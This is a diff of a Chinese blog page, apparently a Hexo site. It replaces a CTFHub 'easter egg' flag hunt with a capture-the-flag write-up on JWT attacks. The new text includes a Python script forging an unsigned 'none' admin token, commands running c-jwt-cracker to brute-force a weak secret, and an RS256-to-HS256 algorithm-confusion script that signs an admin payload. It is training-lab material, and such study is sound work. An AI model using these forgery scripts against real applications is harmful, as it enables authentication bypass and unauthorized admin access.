@@ -290,28 +290,102 @@
         
           <header class="entry-header">
             <h1 class="entry-title"></h1>
-            <p class="entry-census">&nbsp;·&nbsp;2022-8-28&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+            <p class="entry-census">&nbsp;·&nbsp;2022-8-29&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
 
             <hr>
           </header>
         
         <div class="entry-content">
-          <h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src="https://img-blog.csdnimg.cn/0b4b33ac483e49a9945a279bd42d7cd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这样设置参数<br><img src="https://img-blog.csdnimg.cn/f9fc1f1792d84ca193c1ac4910dfce25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 ==点击响应== 看==响应==包<br><img src="https://img-blog.csdnimg.cn/92c81d3b913d4800a9c19030d3079d7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在最后一行</p>
-<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com" target="_blank" rel="noopener">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src="https://img-blog.csdnimg.cn/42334be7914f498c96d55daecf1f09fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838" target="_blank" rel="noopener">ctfhub-ssrf</a>post最后一行介绍</p>
-<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
-<blockquote>
-<p>彩蛋    关键词    egg    ctfhub    CTFHub    拿来把你    CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是flag</p>
-<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
-<pre><code class="css">ctfhub{029e02eb3a1
-    e8c49b1132b5
-    15b652a5f3a8
-    62013}
+          <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob" target="_blank" rel="noopener">jwt基础知识</a></p>
+<p>flag在下面</p>
+<p>需要了解一下jwt组成部分</p>
+<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>随便输个</p>
+<p>进去查消息头</p>
+<p>然后在</p>
+<p><a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a></p>
+<p>decode    一共两部分ag是另一半</p>
+<p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220331132533661.png" alt="image-20220331132533661"></p>
+<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><pre><code class="python">import jwt
+algorithm=&quot;none&quot;
+header = {
+  &quot;username&quot;: &quot;admin&quot;,
+  &quot;password&quot;: &quot;admin&quot;,
+  &quot;role&quot;:&quot;admin&quot;
+  }
+key = &quot;&quot;
+encoded = jwt.encode(header,key,algorithm)
+print(encoded)
 </code></pre>
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html" target="_blank" rel="noopener">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜==奖励== 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/" target="_blank" rel="noopener">解码</a></p>
-<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
+<p>jwt的签名可以为无</p>
+<blockquote>
+<p>今天写这个脚本的时候命名为jwt.py</p>
+<p>结果报错 但是系统环境运行正常</p>
+<p>才知道是文件名的事</p>
+<p>import jwt 他先自己引用自己了</p>
+</blockquote>
+<p>抓包</p>
+<p>把cookie里的token改为这脚本的运行结果</p>
+<h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">jwt-cracker</a></p>
+<p>依次执行即可</p>
+<pre><code class="shell">git clone https://github.com/brendan-rius/c-jwt-cracker
+./c-jwt-cracker
+make
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs
+</code></pre>
+<p>然后得出该jwt密钥</p>
+<p>然后放之前那个网站</p>
+<p>改role为admin</p>
+<p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220401103754837.png" alt="image-20220401103754837"></p>
+<p>返回提交token</p>
+<p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220401103344937.png" alt="image-20220401103344937"></p>
+<h1 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h1><p>把cookie清空后提交用户名密码</p>
+<p>得到一串jwt</p>
+<p>丢进</p>
+<p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220401111643527.png" alt="image-20220401111643527"></p>
+<p>发现是RS256编码（不对称式编码）</p>
+<p>需要改为对称式编码</p>
+<p>如HS256</p>
+<p>题目中给了public key</p>
+<p>用PUBLIC_KEY采用HS256进行加密payload构造token</p>
+<p>借用<a href="https://blog.csdn.net/loseheart157" target="_blank" rel="noopener">大神h0ld1rs</a>的脚本</p>
+<blockquote>
+<p>无签名那段脚本</p>
+<p>是勉勉强强写出来的</p>
+<p>这题就先用大神的脚本吧</p>
+<p>我太菜了</p>
+</blockquote>
+<pre><code class="python"># coding=GBK
+import hmac
+import hashlib
+import base64
+
+file = open(&#39;publickey.pem&#39;)#需要将文中的publickey下载    与脚本同目录
+key = file.read()
+
+# Paste your header and payload here
+header = &#39;{&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;}&#39;
+payload = &#39;{&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}&#39;
+
+# Creating encoded header
+encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))
+encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)
+
+# Creating encoded payload
+encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))
+encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)
+
+# Concatenating header and payload
+token = (encodeHeader + &quot;.&quot; + encodePayload)
+
+# Creating signature
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)
+
+print(token + &quot;.&quot; + sig)
+</code></pre>
+<p>运行后把token返回去验证</p>
+<p>成功</p>
+<p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220401111559224.png" alt="image-20220401111559224"></p>
+<p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220401111423320.png" alt="image-20220401111423320"></p>
 
         </div>
         <!-- .entry-content -->
@@ -343,7 +417,7 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2022/08/免密ssh登录/" rel="prev">
+            <a href="/2022/08/linux动态加载/" rel="prev">
               <div class="background">
                 <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
@@ -361,7 +435,7 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2022/08/hello-world/" rel="next">
+            <a href="/2022/08/git/" rel="next">
               <div class="background">
                 <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
@@ -369,7 +443,7 @@
               Next Post</span>
               <div class="info">
                 <h3>
-                Hello World</h3>
+                </h3>
                 <hr>
               </div>
             </a>
